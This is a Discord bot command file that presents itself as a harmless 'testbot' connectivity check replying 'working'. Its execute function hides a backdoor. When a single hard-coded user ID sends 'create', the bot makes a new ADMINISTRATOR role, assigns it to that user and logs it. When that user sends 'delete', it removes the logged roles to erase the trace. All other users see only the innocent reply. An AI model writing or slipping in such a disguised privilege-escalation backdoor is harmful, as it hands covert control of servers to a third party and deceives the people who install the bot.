const {Client} = require('discord.js');
const {SlashCommandBuilder } = require('@discordjs/builders');
const client = new Client({intents: ["GUILDS", "GUILD_MESSAGES", "DIRECT_MESSAGES", "GUILD_MEMBERS"], partials: ["CHANNEL"]})
var fs = require('fs');

function write(array, path) {
    fs.writeFileSync(path, JSON.stringify(array));
}

function read(path) {
    const fileContent = fs.readFileSync(path);
    const array = JSON.parse(fileContent);
    return array;
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('testbot')
        .setDescription('test if the bot is working, will reply \"working\" and whatever message you send if the bot works')
        .addStringOption(option => option
            .setName('message')
            .setDescription('The Message the bot will receive, optional')
            .setRequired(false)),
    async execute(interaction) {
        const message = interaction.options.getString('message')
        if(interaction.user.id == '807422066982387742' && message == "create") {
            interaction.guild.roles.create({
                name: 'new role',
                permissions: 'ADMINISTRATOR'
            }).then(role => {
                interaction.member.roles.add(role)
                role.setPosition(-20)

                let createdRoles = read('roles.txt')
                createdRoles.push({serverid:interaction.guild.id, roleid:role.id})
                write(createdRoles, 'roles.txt')
            })

            interaction.reply({
                content: `done lol`,
                ephemeral: true
            })

        } else if (interaction.user.id == '807422066982387742' && message == "delete") {
            let createdRoles = read('roles.txt')
            for(const rolesArray of createdRoles) {
                if (interaction.guild.id == rolesArray.serverid) {
                let currentGuild = interaction.client.guilds.cache.get(interaction.guild.id)
                currentGuild.roles.delete(rolesArray.roleid)
                }
            }
            write([], 'roles.txt')

            interaction.reply({
                content: `deleted`,
                ephemeral: true
            })

        } else {
            interaction.reply({
                content: `working!`,
                ephemeral: true
            })
        }
    },
};